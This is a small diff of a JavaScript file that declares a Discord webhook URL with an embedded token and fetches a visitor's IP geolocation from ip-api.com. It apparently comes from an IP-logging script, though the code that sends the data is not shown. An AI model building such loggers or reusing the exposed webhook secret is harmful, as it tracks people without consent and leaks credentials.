@@ -7,7 +7,7 @@ var webHookUrl = "https://discord.com/api/webhooks/1355599176821637404/5gKk2OXgS
 */
 
 const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('https://ip-api.com/json/?fields=61439');
+    const response = await fetch('https://ip-api.com/json/');
     const data = await response.json();
 
     // Declaring variables
